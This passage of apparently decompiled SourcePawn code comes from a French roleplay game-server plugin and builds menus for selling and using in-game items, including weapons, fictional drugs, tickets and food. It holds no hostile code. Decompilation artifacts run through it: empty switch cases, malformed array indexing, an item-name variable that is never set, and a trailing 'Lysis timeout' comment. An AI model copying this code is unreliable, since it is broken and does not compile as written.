			if (StrEqual(info, "DrogueCoke", true))
			{
				ItemCoke(param1);
				new var62 = DrogueCoke[param1];
				var62 = var62[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez pris de la Cocaine.");
			}
			if (StrEqual(info, "DrogueWeed", true))
			{
				ItemWeed(param1);
				new var63 = DrogueWeed[param1];
				var63 = var63[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez fumer de la Weed.");
			}
			BuildItemMenu(param1, param1);
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(Item);
		}
	}
	return 0;
}

Handle:BuildSellMenu(client, Player)
{
	decl String:Buffer[128];
	new Handle:sell_menu = CreateMenu(Menu_Sell, MenuAction:28);
	SetMenuTitle(sell_menu, "Veuillez choisir un produit a vendre:");
	if (JobID[client][0][0] == 3)
	{
		Format(Buffer, 128, "%i_50_52", Player);
		AddMenuItem(sell_menu, Buffer, "Pizza (Prix: 50$)", 0);
	}
	if (JobID[client][0][0] == 6)
	{
		new var1;
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 128, "%i_100_1", Player);
			AddMenuItem(sell_menu, Buffer, "Glock (Prix: 100$)", 0);
			Format(Buffer, 128, "%i_100_2", Player);
			AddMenuItem(sell_menu, Buffer, "USP (Prix: 100$)", 0);
			Format(Buffer, 128, "%i_125_3", Player);
			AddMenuItem(sell_menu, Buffer, "P228 (Prix: 125$)", 0);
			Format(Buffer, 128, "%i_200_4", Player);
			AddMenuItem(sell_menu, Buffer, "Deagle (Prix: 200$)", 0);
			Format(Buffer, 128, "%i_250_5", Player);
			AddMenuItem(sell_menu, Buffer, "Elites (Prix: 250$)", 0);
			Format(Buffer, 128, "%i_180_6", Player);
			AddMenuItem(sell_menu, Buffer, "Five Seven (Prix: 180$)", 0);
			Format(Buffer, 128, "%i_400_7", Player);
			AddMenuItem(sell_menu, Buffer, "M3 (Prix: 400$)", 0);
			Format(Buffer, 128, "%i_600_8", Player);
			AddMenuItem(sell_menu, Buffer, "XM1014 (Prix: 600$)", 0);
			Format(Buffer, 128, "%i_400_9", Player);
			AddMenuItem(sell_menu, Buffer, "Galil (Prix: 400$)", 0);
			Format(Buffer, 128, "%i_600_10", Player);
			AddMenuItem(sell_menu, Buffer, "Ak47 (Prix: 600$)", 0);
			Format(Buffer, 128, "%i_650_11", Player);
			AddMenuItem(sell_menu, Buffer, "Scout (Prix: 650$)", 0);
			Format(Buffer, 128, "%i_500_12", Player);
			AddMenuItem(sell_menu, Buffer, "Sg552 (Prix: 500$)", 0);
			Format(Buffer, 128, "%i_1000_13", Player);
			AddMenuItem(sell_menu, Buffer, "AWP (Prix: 1000$)", 0);
			Format(Buffer, 128, "%i_1000_14", Player);
			AddMenuItem(sell_menu, Buffer, "G3SG1 (Prix: 1000$)", 0);
			Format(Buffer, 128, "%i_450_15", Player);
			AddMenuItem(sell_menu, Buffer, "Famas (Prix: 450$)", 0);
			Format(Buffer, 128, "%i_600_16", Player);
			AddMenuItem(sell_menu, Buffer, "M4A1 (Prix: 600$)", 0);
			Format(Buffer, 128, "%i_500_17", Player);
			AddMenuItem(sell_menu, Buffer, "Aug (Prix: 500$)", 0);
			Format(Buffer, 128, "%i_1000_18", Player);
			AddMenuItem(sell_menu, Buffer, "Sg550 (Prix: 1000$)", 0);
			Format(Buffer, 128, "%i_300_19", Player);
			AddMenuItem(sell_menu, Buffer, "Mac10 (Prix: 300$)", 0);
			Format(Buffer, 128, "%i_300_20", Player);
			AddMenuItem(sell_menu, Buffer, "TMP (Prix: 300$)", 0);
			Format(Buffer, 128, "%i_400_21", Player);
			AddMenuItem(sell_menu, Buffer, "Mp5 Navy (Prix: 400$)", 0);
			Format(Buffer, 128, "%i_350_22", Player);
			AddMenuItem(sell_menu, Buffer, "Ump45 (Prix: 350$)", 0);
			Format(Buffer, 128, "%i_450_23", Player);
			AddMenuItem(sell_menu, Buffer, "P90 (Prix: 450$)", 0);
			Format(Buffer, 128, "%i_1250_24", Player);
			AddMenuItem(sell_menu, Buffer, "M249 (Prix: 1250$)", 0);
		}
		new var2;
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 128, "%i_100_25", Player);
			AddMenuItem(sell_menu, Buffer, "Grenade (Prix: 100$)", 0);
			Format(Buffer, 128, "%i_100_26", Player);
			AddMenuItem(sell_menu, Buffer, "Flashbang (Prix: 100$)", 0);
			Format(Buffer, 128, "%i_100_27", Player);
			AddMenuItem(sell_menu, Buffer, "Fumigene (Prix: 100$)", 0);
			Format(Buffer, 128, "%i_600_28", Player);
			AddMenuItem(sell_menu, Buffer, "Kevlar (Prix: 600$)", 0);
		}
		Format(Buffer, 128, "%i_150_29", Player);
		AddMenuItem(sell_menu, Buffer, "Cartouche (Prix: 150$)", 0);
	}
	if (JobID[client][0][0] == 2)
	{
		new var3;
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 128, "%i_200_30", Player);
			AddMenuItem(sell_menu, Buffer, "Kit de Soins (Prix: 200$)", 0);
		}
		if (RankID[client][0][0] == 3)
		{
			FakeClientCommand(client, "sm_chirurgie");
		}
	}
	if (JobID[client][0][0] == 8)
	{
		Format(Buffer, 128, "%i_200_31", Player);
		AddMenuItem(sell_menu, Buffer, "LSD (Prix: 200$)", 0);
		Format(Buffer, 128, "%i_200_32", Player);
		AddMenuItem(sell_menu, Buffer, "Heroine (Prix: 200$)", 0);
		Format(Buffer, 128, "%i_200_33", Player);
		AddMenuItem(sell_menu, Buffer, "Extasy (Prix: 200$)", 0);
		Format(Buffer, 128, "%i_200_34", Player);
		AddMenuItem(sell_menu, Buffer, "Cocaine (Prix: 200$)", 0);
		Format(Buffer, 128, "%i_200_35", Player);
		AddMenuItem(sell_menu, Buffer, "Weed (Prix: 200$)", 0);
	}
	if (JobID[client][0][0] == 9)
	{
		new var4;
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 128, "%i_1500_36", Player);
			AddMenuItem(sell_menu, Buffer, "AirControl (Prix: 1500$)", 0);
		}
		new var5;
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 128, "%i_500_37", Player);
			AddMenuItem(sell_menu, Buffer, "Bonbonne de Gaz AC (Prix: 500$)", 0);
		}
	}
	if (JobID[client][0][0] == 11)
	{
		Format(Buffer, 128, "%i_10_38", Player);
		AddMenuItem(sell_menu, Buffer, "Ticket de 10$ (Prix: 10$)", 0);
		Format(Buffer, 128, "%i_50_39", Player);
		AddMenuItem(sell_menu, Buffer, "Ticket de 50$ (Prix: 50$)", 0);
		if (RankID[client][0][0] != 2)
		{
			Format(Buffer, 128, "%i_100_40", Player);
			AddMenuItem(sell_menu, Buffer, "Ticket de 100$ (Prix: 100$)", 0);
		}
		new var6;
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 128, "%i_500_41", Player);
			AddMenuItem(sell_menu, Buffer, "Ticket de 500$ (Prix: 500$)", 0);
		}
	}
	if (JobID[client][0][0] == 14)
	{
		new var7;
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 128, "%i_200_42", Player);
			AddMenuItem(sell_menu, Buffer, "Diplome de Tir (Prix: 200$)", 0);
			Format(Buffer, 128, "%i_400_53", Player);
			AddMenuItem(sell_menu, Buffer, "Billes de Couleur(500 billes) (Prix: 400$)", 0);
		}
	}
	if (JobID[client][0][0] == 16)
	{
		Format(Buffer, 128, "%i_50_43", Player);
		AddMenuItem(sell_menu, Buffer, "Cafe (Prix: 50$)", 0);
		Format(Buffer, 128, "%i_45_44", Player);
		AddMenuItem(sell_menu, Buffer, "NuteChoco (Prix: 45$)", 0);
		Format(Buffer, 128, "%i_60_45", Player);
		AddMenuItem(sell_menu, Buffer, "GateauChoco (Prix: 60$)", 0);
		Format(Buffer, 128, "%i_95_46", Player);
		AddMenuItem(sell_menu, Buffer, "Sucette Menthe (Prix: 95$)", 0);
		Format(Buffer, 128, "%i_125_47", Player);
		AddMenuItem(sell_menu, Buffer, "Droom (Prix: 125$)", 0);
		Format(Buffer, 128, "%i_200_48", Player);
		AddMenuItem(sell_menu, Buffer, "Lessive (Prix: 200$)", 0);
	}
	if (JobID[client][0][0] == 19)
	{
		new var8;
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 128, "%i_50_49", Player);
			AddMenuItem(sell_menu, Buffer, "Bouteille de Vodka (Prix: 50$)", 0);
			if (RankID[client][0][0] == 1)
			{
				Format(Buffer, 128, "%i_150_50", Player);
				AddMenuItem(sell_menu, Buffer, "Canette de Redbull (Prix: 150$)", 0);
			}
			Format(Buffer, 128, "%i_150_51", Player);
			AddMenuItem(sell_menu, Buffer, "Mojito (Prix: 150$)", 0);
		}
	}
	DisplayMenu(sell_menu, client, 0);
	return Handle:0;
}

public Menu_Sell(Handle:sell_menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[64];
		new SellPlayerID = 0;
		new Price = 0;
		new ItemID = 0;
		GetMenuItem(sell_menu, param2, info, 64, 0, "", 0);
		decl String:Buffer[12][64];
		ExplodeString(info, "_", Buffer, 3, 64, false);
		SellPlayerID = StringToInt(Buffer[0][Buffer], 10);
		Price = StringToInt(Buffer[1], 10);
		ItemID = StringToInt(Buffer[2], 10);
		decl String:Quantite[32];
		new Handle:sell_menuQuantity = CreateMenu(Menu_Quantity, MenuAction:28);
		SetMenuTitle(sell_menuQuantity, "Choissisez une quantite:");
		Format(Quantite, 32, "%i_%i_%i_1", SellPlayerID, Price, ItemID);
		AddMenuItem(sell_menuQuantity, Quantite, "1", 0);
		Format(Quantite, 32, "%i_%i_%i_5", SellPlayerID, Price, ItemID);
		AddMenuItem(sell_menuQuantity, Quantite, "5", 0);
		Format(Quantite, 32, "%i_%i_%i_10", SellPlayerID, Price, ItemID);
		AddMenuItem(sell_menuQuantity, Quantite, "10", 0);
		Format(Quantite, 32, "%i_%i_%i_25", SellPlayerID, Price, ItemID);
		AddMenuItem(sell_menuQuantity, Quantite, "25", 0);
		Format(Quantite, 32, "%i_%i_%i_50", SellPlayerID, Price, ItemID);
		AddMenuItem(sell_menuQuantity, Quantite, "50", 0);
		Format(Quantite, 32, "%i_%i_%i_100", SellPlayerID, Price, ItemID);
		AddMenuItem(sell_menuQuantity, Quantite, "100", 0);
		DisplayMenu(sell_menuQuantity, param1, 0);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(sell_menu);
		}
	}
	return 0;
}

public Menu_Quantity(Handle:sell_menuQuantity, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[64];
		new SellPlayerID = 0;
		new QuantityItem = 0;
		new Price = 0;
		new ItemID = 0;
		decl String:sSellItem[64];
		new PriceFinal = 0;
		GetMenuItem(sell_menuQuantity, param2, info, 64, 0, "", 0);
		decl String:Buffer[16][64];
		ExplodeString(info, "_", Buffer, 4, 64, false);
		SellPlayerID = StringToInt(Buffer[0][Buffer], 10);
		Price = StringToInt(Buffer[1], 10);
		ItemID = StringToInt(Buffer[2], 10);
		QuantityItem = StringToInt(Buffer[3], 10);
		switch (ItemID)
		{
			case 1:
			{
			}
			case 2:
			{
			}
			case 3:
			{
			}
			case 4:
			{
			}
			case 5:
			{
			}
			case 6:
			{
			}
			case 7:
			{
			}
			case 8:
			{
			}
			case 9:
			{
			}
			case 10:
			{
			}
			case 11:
			{
			}
			case 12:
			{
			}
			case 13:
			{
			}
			case 14:
			{
			}
			case 15:
			{
			}
			case 16:
			{
			}
			case 17:
			{
			}
			case 18:
			{
			}
			case 19:
			{
			}
			case 20:
			{
			}
			case 21:
			{
			}
			case 22:
			{
			}
			case 23:
			{
			}
			case 24:
			{
			}
			case 25:
			{
			}
			case 26:
			{
			}
			case 27:
			{
			}
			case 28:
			{
			}
			case 29:
			{
			}
			case 30:
			{
			}
			case 31:
			{
			}
			case 32:
			{
			}
			case 33:
			{
			}
			case 34:
			{
			}
			case 35:
			{
			}
			case 36:
			{
			}
			case 37:
			{
			}
			case 38:
			{
			}
			case 39:
			{
			}
			case 40:
			{
			}
			case 41:
			{
			}
			case 42:
			{
			}
			case 43:
			{
			}
			case 44:
			{
			}
			case 45:
			{
			}
			case 46:
			{
			}
			case 47:
			{
			}
			case 48:
			{
			}
			case 49:
			{
			}
			case 50:
			{
			}
			case 51:
			{
			}
			case 52:
			{
			}
			case 53:
			{
			}
			default:
			{
			}
		}
		if (SellPlayerID == param1)
		{
			PriceFinal = QuantityItem * Price / 2;
		}
		else
		{
			PriceFinal = QuantityItem * Price;
		}
		decl String:Choix[32];
		new Handle:sell_menuPlayer = CreateMenu(Menu_SellPlayer, MenuAction:28);
		if (SellPlayerID != param1)
		{
			SetMenuTitle(sell_menuPlayer, "%N vous propose de vous vendre un %s (Quantite: %i) pour %i$", param1, sSellItem, QuantityItem, PriceFinal);
		}
		else
		{
			SetMenuTitle(sell_menuPlayer, "Voulez-vous acheter un %s (Quantite: %i) pour %i$", sSellItem, QuantityItem, PriceFinal);
		}
		Format(Choix, 32, "%i_%i_%i_%i_a", param1, QuantityItem, ItemID, PriceFinal);
		AddMenuItem(sell_menuPlayer, Choix, "Accepter l'offre", 0);
		if (PlayerHasCB[SellPlayerID][0][0] == 1)
		{
			Format(Choix, 32, "%i_%i_%i_%i_aCB", param1, QuantityItem, ItemID, PriceFinal);
			AddMenuItem(sell_menuPlayer, Choix, "Accepter l'offre et payer par CB", 0);
		}
		Format(Choix, 32, "%i_%i_%i_%i_r", param1, QuantityItem, ItemID, PriceFinal);
		AddMenuItem(sell_menuPlayer, Choix, "Decliner l'offre", 0);
		DisplayMenu(sell_menuPlayer, SellPlayerID, 30);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(sell_menuQuantity);
		}
	}
	return 0;
}


/* Lysis timeout. */
